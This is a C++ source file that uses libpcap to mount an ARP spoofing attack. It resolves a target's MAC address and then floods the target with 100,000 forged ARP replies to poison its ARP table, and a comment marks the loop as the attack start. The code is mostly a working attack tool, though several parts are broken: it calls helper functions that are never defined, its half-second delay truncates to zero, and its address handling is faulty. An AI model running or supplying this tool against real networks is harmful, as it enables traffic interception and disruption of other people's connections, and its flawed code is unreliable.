#include <unistd.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>     // libpcap header
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <net/if.h> 
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <linux/if_link.h>
#include "packet_struct.h"

#define 	ETHERTYPE_ARP 	0x0806
#define 	ETHERTYPE_IP 	0x0800
#define		ARP_REQUEST		0x1
#define		ARP_REPLY		0x2 


#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"

char *dev;
pcap_t* handle;
char my_ip[16];
char errbuf[PCAP_ERRBUF_SIZE];
unsigned char mac_address[6];
unsigned char target_mac_address[6];
static unsigned char dhr[6];
char *sender;
char *tip;

void find_my_mac(void)
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }


    if (success){
		memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
	}
	else{
	   	std::cout << "\x1B[36m[-] can't find mac address\x1B[37m" << std::endl;
		exit(0);
	}
}


void arp_reply()
{
    unsigned char packet[1514];

	std::cout << "[+] ARP_REPLY... Change ARP Table!" << std::endl;

    struct ether_header* eth_h = (struct ether_header *)packet;
    memcpy((void *)eth_h->ether_dhost.ether_addr_octet, (const void *)target_mac_address, 6);
    memcpy((void *)eth_h->ether_shost.ether_addr_octet, (const void *)mac_address, 6);
    eth_h->ether_type = ntohs(ETHERTYPE_ARP);

    struct arp_hdr* arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_header));
    arp_h->ar_hrd = htons(1);
    arp_h->ar_pro = htons(ETHERTYPE_IP);
    arp_h->ar_hln = 6;
    arp_h->ar_pln = 4;
    arp_h->ar_op = ntohs(ARP_REPLY);
    memcpy((void *)arp_h->ar_sha, (const void *)mac_address, 6);
    memcpy((void *)arp_h->ar_tha, (const void *)target_mac_address, 6);
    *(unsigned char *)arp_h->ar_sip = inet_addr((const char *)sender);
    *(unsigned char *)arp_h->ar_tip = inet_addr((const char *)tip);

    pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct arp_hdr));
	std::cout << "[+] ARP_REPLY is done." << std::endl;
	std::cout << "\033[1;32m[+] Done! Check it now!\033[0m" << std::endl;
}



void *arp_request(void *)
{
    unsigned char packet[1514];

	std::cout << "[-] ARP_Request[BroadCase] -> getting target's MAC address" << std::endl;
    struct ether_header* eth_h = (struct ether_header *)packet;
    memcpy((void *)eth_h->ether_dhost.ether_addr_octet, (const void *)"\xff\xff\xff\xff\xff\xff", 6);
    memcpy((void *)eth_h->ether_shost.ether_addr_octet, (const void *)mac_address, 6);
    eth_h->ether_type = ntohs(ETHERTYPE_ARP);

    struct arp_hdr* arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_header));
    arp_h->ar_hrd = htons(1);
    arp_h->ar_pro = htons(ETHERTYPE_IP);
    arp_h->ar_hln = 6;
    arp_h->ar_pln = 4;
    arp_h->ar_op = ntohs(ARP_REQUEST);
    memcpy((void *)arp_h->ar_sha, (const void *)mac_address, 6);
    //memcpy((void *)arp_h->ar_sip[i], (const void *)my_ip, 4);
    *(unsigned char *)arp_h->ar_sip = inet_addr((const char *)my_ip);
    memcpy((void *)arp_h->ar_tha, (const void *)"\x00\x00\x00\x00\x00\x00", 6);
    *(unsigned char *)arp_h->ar_tip = inet_addr((const char *)sender);

    pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct arp_hdr));
	std::cout << "[-] ARP_Request is done." << std::endl;
}


void *arp_capture(void *)
{
    struct pcap_pkthdr *header; /* The header that pcap gives us */
    const u_char *packet;       /* The actual packet */
    int res;

	//pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	std::cout << "[-] Capture ARP_REPLY..." << std::endl;
    /* Grab a packet */
    while(1){
        res = pcap_next_ex(handle, &header, &packet);
        if(res == 1){
            struct ether_header* eth_h = (struct ether_header *)packet;
            if(ntohs(eth_h->ether_type) == ETHERTYPE_ARP){
                struct arp_hdr* arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_header));
                if ((ntohs(arp_h->ar_op) == ARP_REPLY) && (*(uint32_t *)arp_h->ar_sip == inet_addr((const char *)tip))){
					std::cout << "\x1B[36m[-] Find target_IP's MAC addr : \x1B[37m";
                    for(int i = 0; i < 6; i++){
                        printf("%02X",(arp_h->ar_sha[i]));
						target_mac_address[i] = (unsigned char)arp_h->ar_sha[i];
					}
					std::cout << std::endl;
                    memcpy(dhr, arp_h->ar_sha, 6);
                    break;
                }
            }
            else{
                continue;
            }
        }
    }
}


int main(int argc, char *argv[])
{

	if( argc < 4 )
	{
		fprintf(stderr, "\x1B[31m[-] Wrong Usage : %s [en0] [src] [dst]\x1B[37m\n", argv[0]);
	}

	pthread_t reqThread, captureThread;

	dev = argv[1];
	if(!get_my_addr(dev, my_ip)) exit(-1);

	printf("[-] my ip : %s\n", my_ip);

	check_interface(dev);
	check_ipaddr(argv[2], argv[3]);
	find_my_mac();
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	sender = argv[2];
	tip = argv[3];

	/* for getting target mac address */

	pthread_create(&reqThread, NULL, arp_request, NULL);
	pthread_create(&captureThread, NULL, arp_capture, NULL);

	/* arp spoofing attack start */

	for(int i = 0; i < 100000; i++){
		sleep(0.5);
		arp_reply();
	}

	return 0;
}
